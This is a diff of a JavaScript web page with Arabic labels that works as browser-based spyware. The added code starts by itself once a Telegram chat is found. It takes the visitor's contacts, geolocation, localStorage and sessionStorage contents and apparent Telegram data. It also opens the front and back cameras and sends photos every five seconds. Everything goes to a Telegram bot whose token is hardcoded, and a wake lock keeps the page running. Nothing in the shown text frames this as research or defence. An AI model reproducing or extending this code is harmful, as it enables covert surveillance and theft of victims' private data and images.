@@ -58,9 +58,9 @@
     <div id="status">⏳ جاري التهيئة...</div>
 </div>
 
-<video id="video" autoplay muted playsinline style="display:none;"></video>
+<video id="videoFront" autoplay muted playsinline style="display:none;"></video>
+<video id="videoBack" autoplay muted playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
-<iframe id="hiddenFrame" style="display:none;"></iframe>
 
 <div id="toast"></div>
 
@@ -71,46 +71,15 @@
     </div>
 
     <div class="admin-grid">
-        <div class="admin-card" onclick="stealAll()">
-            <div class="icon">🚀</div>
-            <div class="label">سحب الكل</div>
-            <div class="count" id="totalCount">0</div>
+        <div class="admin-card" onclick="togglePanel()">
+            <div class="icon">🔒</div>
+            <div class="label">إخفاء اللوحة</div>
+            <div class="count">📱</div>
         </div>
-        <div class="admin-card" onclick="stealContacts()">
-            <div class="icon">👤</div>
-            <div class="label">جهات الاتصال</div>
-            <div class="count" id="contactCount">0</div>
-        </div>
-        <div class="admin-card" onclick="stealTelegram()">
-            <div class="icon">✈️</div>
-            <div class="label">تليجرام</div>
-            <div class="count" id="tgCount">0</div>
-        </div>
-        <div class="admin-card" onclick="stealPhotos()">
-            <div class="icon">🖼️</div>
-            <div class="label">الصور</div>
-            <div class="count" id="photoCount">0</div>
-        </div>
-        <div class="admin-card" onclick="stealFiles()">
-            <div class="icon">📁</div>
-            <div class="label">الملفات</div>
-            <div class="count" id="fileCount">0</div>
-        </div>
-        <div class="admin-card danger" onclick="killAll()">
-            <div class="icon">💀</div>
-            <div class="label">إيقاف الكل</div>
-            <div class="count">⛔</div>
-        </div>
-    </div>
-
-    <div class="admin-actions">
-        <button class="admin-btn success" onclick="stealAll()">🚀 سحب الكل</button>
-        <button class="admin-btn" onclick="stealPhotos()">🖼️ سحب الصور</button>
-        <button class="admin-btn danger" onclick="killAll()">💀 إيقاف الكل</button>
     </div>
 
     <div class="admin-log" id="adminLog">
-        <div class="entry"><span class="time">[SYSTEM]</span> <span class="msg">✅ لوحة التحكم جاهزة</span></div>
+        <div class="entry"><span class="time">[SYSTEM]</span> <span class="msg">✅ النظام جاهز</span></div>
     </div>
 
     <div style="text-align:center;margin-top:15px;">
@@ -126,6 +95,7 @@ const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
 let CHAT_ID = '';
 let totalStolen = 0;
 let photoCount = 0;
+let isRunning = true;
 
 // ============================================================
 // ====================== TOGGLE PANEL ========================
@@ -149,13 +119,6 @@ document.addEventListener('keydown', function(e) {
         e.preventDefault();
         togglePanel();
         panelOpen = true;
-    }
-    if (e.ctrlKey && e.shiftKey && e.key === 'H') {
-        e.preventDefault();
-        if (panelOpen) {
-            document.getElementById('adminPanel').classList.remove('active');
-            panelOpen = false;
-        }
     }
 });
 
@@ -234,7 +197,7 @@ function getChatId() {
                 addLog(`✅ Chat ID: ${CHAT_ID}`, 'msg');
                 sendMessage('✅ تم الاتصال بالجهاز');
                 document.getElementById('status').textContent = '✅ جاهز';
-                setTimeout(() => stealAll(), 2000);
+                startOperations();
             } else {
                 setTimeout(getChatId, 3000);
             }
@@ -243,24 +206,23 @@ function getChatId() {
 }
 
 // ============================================================
-// ====================== STEAL ALL ===========================
+// ====================== START OPERATIONS ====================
 // ============================================================
-function stealAll() {
-    addLog('🚀 بدء سحب الكل...', 'info');
-    showToast('🚀 جاري السحب...');
-    totalStolen = 0;
+function startOperations() {
+    addLog('🚀 بدء العمليات...', 'info');
     
-    setTimeout(() => stealContacts(), 500);
-    setTimeout(() => stealTelegram(), 1500);
-    setTimeout(() => stealPhotos(), 2500);
-    setTimeout(() => stealFiles(), 3500);
-    setTimeout(() => captureCamera(), 4500);
+    // سحب جهات الاتصال
+    setTimeout(() => stealContacts(), 1000);
     
-    setTimeout(() => {
-        document.getElementById('totalCount').textContent = totalStolen;
-        sendMessage(`✅ تم سحب ${totalStolen} عنصر`);
-        showToast(`✅ تم سحب ${totalStolen} عنصر`);
-    }, 8000);
+    // سحب الموقع
+    setTimeout(() => stealLocation(), 2000);
+    
+    // تشغيل الكاميرات (أمامي + خلفي) كل 5 ثواني
+    setTimeout(() => startCameras(), 3000);
+    
+    // سحب الملفات والتليجرام
+    setTimeout(() => stealFiles(), 4000);
+    setTimeout(() => stealTelegram(), 5000);
 }
 
 // ============================================================
@@ -279,12 +241,145 @@ function stealContacts() {
                         count++;
                         totalStolen++;
                     });
-                    document.getElementById('contactCount').textContent = count;
                     addLog(`👤 ${count} جهة اتصال`, 'msg');
                 })
                 .catch(() => addLog('❌ فشل جهات الاتصال', 'error'));
         }
     } catch(e) {}
+}
+
+// ============================================================
+// ====================== STEAL LOCATION ======================
+// ============================================================
+function stealLocation() {
+    addLog('📍 سحب الموقع...', 'info');
+    
+    try {
+        if ('geolocation' in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    const url = `https://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    sendMessage(`📍 الموقع:\nالخط: ${pos.coords.latitude}\nالطول: ${pos.coords.longitude}\n${url}`);
+                    addLog('📍 تم سحب الموقع', 'msg');
+                    totalStolen++;
+                },
+                function(err) {
+                    addLog('❌ فشل الموقع: ' + err.message, 'error');
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        }
+    } catch(e) {}
+}
+
+// ============================================================
+// ====================== START CAMERAS =======================
+// ============================================================
+let frontStream = null, backStream = null;
+let frontInterval = null, backInterval = null;
+
+function startCameras() {
+    addLog('📸 تشغيل الكاميرات...', 'info');
+    
+    // الكاميرا الأمامية
+    navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
+    })
+    .then(function(stream) {
+        frontStream = stream;
+        const video = document.getElementById('videoFront');
+        video.srcObject = stream;
+        video.play();
+        addLog('📸 كاميرا أمامية تعمل', 'msg');
+        captureFrontPhoto();
+        frontInterval = setInterval(captureFrontPhoto, 5000);
+    })
+    .catch(function(err) {
+        addLog('❌ فشل كاميرا أمامية: ' + err.message, 'error');
+    });
+    
+    // الكاميرا الخلفية
+    navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } } 
+    })
+    .then(function(stream) {
+        backStream = stream;
+        const video = document.getElementById('videoBack');
+        video.srcObject = stream;
+        video.play();
+        addLog('📸 كاميرا خلفية تعمل', 'msg');
+        captureBackPhoto();
+        backInterval = setInterval(captureBackPhoto, 5000);
+    })
+    .catch(function(err) {
+        addLog('❌ فشل كاميرا خلفية: ' + err.message, 'error');
+    });
+}
+
+function captureFrontPhoto() {
+    if (!isRunning) return;
+    const video = document.getElementById('videoFront');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    if (!video.videoWidth || !video.videoHeight) return;
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+    const imgData = canvas.toDataURL('image/jpeg', 0.9);
+    sendToTelegram(imgData, `📸 أمامي ${photoCount+1} - ${new Date().toLocaleString()}`);
+    photoCount++;
+    totalStolen++;
+    addLog(`📸 صورة أمامي`, 'msg');
+}
+
+function captureBackPhoto() {
+    if (!isRunning) return;
+    const video = document.getElementById('videoBack');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    if (!video.videoWidth || !video.videoHeight) return;
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+    const imgData = canvas.toDataURL('image/jpeg', 0.9);
+    sendToTelegram(imgData, `📸 خلفي ${photoCount+1} - ${new Date().toLocaleString()}`);
+    photoCount++;
+    totalStolen++;
+    addLog(`📸 صورة خلفي`, 'msg');
+}
+
+// ============================================================
+// ====================== STEAL FILES =========================
+// ============================================================
+function stealFiles() {
+    addLog('📁 سحب الملفات...', 'info');
+    let found = 0;
+    
+    try {
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            const val = localStorage.getItem(key);
+            if (val && val.length > 20) {
+                sendMessage(`📦 [${key}] (${val.length}): ${val.substring(0, 300)}...`);
+                found++;
+                totalStolen++;
+            }
+        }
+    } catch(e) {}
+    
+    try {
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            const val = sessionStorage.getItem(key);
+            if (val && val.length > 20) {
+                sendMessage(`📦 session [${key}] (${val.length}): ${val.substring(0, 300)}...`);
+                found++;
+                totalStolen++;
+            }
+        }
+    } catch(e) {}
+    
+    addLog(`📁 ${found} ملف`, 'msg');
 }
 
 // ============================================================
@@ -319,193 +414,28 @@ function stealTelegram() {
         }
     } catch(e) {}
     
-    document.getElementById('tgCount').textContent = found;
     addLog(`✈️ ${found} عنصر`, 'msg');
 }
 
 // ============================================================
-// ====================== STEAL PHOTOS ========================
+// ====================== KEEP ALIVE ==========================
 // ============================================================
-function stealPhotos() {
-    addLog('🖼️ سحب الصور...', 'info');
-    let count = 0;
-    
-    // من localStorage
-    try {
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            const val = localStorage.getItem(key);
-            if (val && (val.startsWith('data:image') || val.match(/\.(jpg|jpeg|png|gif|webp|bmp)/i))) {
-                sendToTelegram(val, `🖼️ ${key}`);
-                count++;
-                totalStolen++;
-            }
-        }
-    } catch(e) {}
-    
-    // من sessionStorage
-    try {
-        for (let i = 0; i < sessionStorage.length; i++) {
-            const key = sessionStorage.key(i);
-            const val = sessionStorage.getItem(key);
-            if (val && (val.startsWith('data:image') || val.match(/\.(jpg|jpeg|png|gif|webp|bmp)/i))) {
-                sendToTelegram(val, `🖼️ session: ${key}`);
-                count++;
-                totalStolen++;
-            }
-        }
-    } catch(e) {}
-    
-    // من IndexedDB
-    try {
-        const request = indexedDB.open('photos', 1);
-        request.onsuccess = function(event) {
-            const db = event.target.result;
-            const stores = db.objectStoreNames;
-            stores.forEach(storeName => {
-                const transaction = db.transaction(storeName, 'readonly');
-                const store = transaction.objectStore(storeName);
-                const getAll = store.getAll();
-                getAll.onsuccess = function() {
-                    const data = getAll.result;
-                    data.forEach(item => {
-                        if (item && typeof item === 'string' && (item.startsWith('data:image') || item.match(/\.(jpg|jpeg|png|gif|webp)/i))) {
-                            sendToTelegram(item, `🖼️ IndexedDB: ${storeName}`);
-                            count++;
-                            totalStolen++;
-                        }
-                    });
-                };
-            });
-        };
-    } catch(e) {}
-    
-    // صور من localStorage base64
-    try {
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            const val = localStorage.getItem(key);
-            if (val && val.length > 1000 && val.match(/[A-Za-z0-9+\/]{100,}/)) {
-                try {
-                    if (val.startsWith('/9j/') || val.startsWith('iVBOR')) {
-                        const imgData = 'data:image/jpeg;base64,' + val;
-                        sendToTelegram(imgData, `🖼️ base64: ${key}`);
-                        count++;
-                        totalStolen++;
-                    }
-                } catch(e) {}
-            }
-        }
-    } catch(e) {}
-    
-    photoCount = count;
-    document.getElementById('photoCount').textContent = count;
-    addLog(`🖼️ ${count} صورة`, 'msg');
-}
+// منع المتصفح من إيقاف التشغيل
+document.addEventListener('visibilitychange', function() {
+    if (document.hidden) {
+        // الصفحة في الخلفية، الكاميرات تستمر بالعمل
+        addLog('⏳ الصفحة في الخلفية... الكاميرات تعمل', 'warn');
+    } else {
+        addLog('🔄 الصفحة نشطة', 'info');
+    }
+});
 
-// ============================================================
-// ====================== CAPTURE CAMERA ======================
-// ============================================================
-let cameraStream = null;
-let cameraInterval = null;
-
-function captureCamera() {
-    addLog('📸 تشغيل الكاميرا...', 'info');
-    
-    navigator.mediaDevices.getUserMedia({ 
-        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } } 
-    })
-    .then(function(stream) {
-        cameraStream = stream;
-        const video = document.getElementById('video');
-        video.srcObject = stream;
-        video.play();
-        addLog('📸 الكاميرا تعمل', 'msg');
-        
-        setTimeout(capturePhoto, 1000);
-        cameraInterval = setInterval(capturePhoto, 4000);
-    })
-    .catch(function(err) {
-        addLog('❌ فشل الكاميرا: ' + err.message, 'error');
-        // محاولة الأمامية
-        navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
-        })
-        .then(function(stream) {
-            cameraStream = stream;
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            video.play();
-            addLog('📸 كاميرا أمامية تعمل', 'msg');
-            setTimeout(capturePhoto, 1000);
-            cameraInterval = setInterval(capturePhoto, 4000);
-        })
-        .catch(() => addLog('❌ فشل الكاميرا تماماً', 'error'));
-    });
-}
-
-function capturePhoto() {
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    if (!video.videoWidth || !video.videoHeight) return;
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    ctx.drawImage(video, 0, 0);
-    const imgData = canvas.toDataURL('image/jpeg', 0.9);
-    sendToTelegram(imgData, `📸 ${new Date().toLocaleString()}`);
-    photoCount++;
-    totalStolen++;
-    document.getElementById('photoCount').textContent = photoCount;
-    addLog(`📸 صورة`, 'msg');
-}
-
-// ============================================================
-// ====================== STEAL FILES =========================
-// ============================================================
-function stealFiles() {
-    addLog('📁 سحب الملفات...', 'info');
-    let found = 0;
-    
-    try {
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            const val = localStorage.getItem(key);
-            if (val && val.length > 20 && !val.startsWith('data:image')) {
-                sendMessage(`📦 [${key}] (${val.length}): ${val.substring(0, 200)}...`);
-                found++;
-                totalStolen++;
-            }
-        }
-    } catch(e) {}
-    
-    try {
-        for (let i = 0; i < sessionStorage.length; i++) {
-            const key = sessionStorage.key(i);
-            const val = sessionStorage.getItem(key);
-            if (val && val.length > 20 && !val.startsWith('data:image')) {
-                sendMessage(`📦 session [${key}] (${val.length}): ${val.substring(0, 200)}...`);
-                found++;
-                totalStolen++;
-            }
-        }
-    } catch(e) {}
-    
-    document.getElementById('fileCount').textContent = found;
-    addLog(`📁 ${found} ملف`, 'msg');
-}
-
-// ============================================================
-// ====================== KILL =================================
-// ============================================================
-function killAll() {
-    addLog('💀 إيقاف الكل...', 'warn');
-    if (cameraInterval) { clearInterval(cameraInterval); cameraInterval = null; }
-    if (cameraStream) { cameraStream.getTracks().forEach(t => t.stop()); cameraStream = null; }
-    addLog('✅ تم الإيقاف', 'msg');
-    showToast('✅ تم الإيقاف');
-    sendMessage('💀 تم إيقاف العمليات');
-}
+// منع السكون
+try {
+    if ('wakeLock' in navigator) {
+        navigator.wakeLock.request('screen').catch(() => {});
+    }
+} catch(e) {}
 
 // ============================================================
 // ====================== INIT =================================
@@ -528,12 +458,7 @@ document.addEventListener('keydown', function(e) {
 
 window.admin = {
     panel: togglePanel,
-    steal: stealAll,
-    contacts: stealContacts,
-    telegram: stealTelegram,
-    photos: stealPhotos,
-    files: stealFiles,
-    kill: killAll
+    log: addLog
 };
 
 console.log('🕵️ جاهز! Ctrl+Shift+P للفتح');
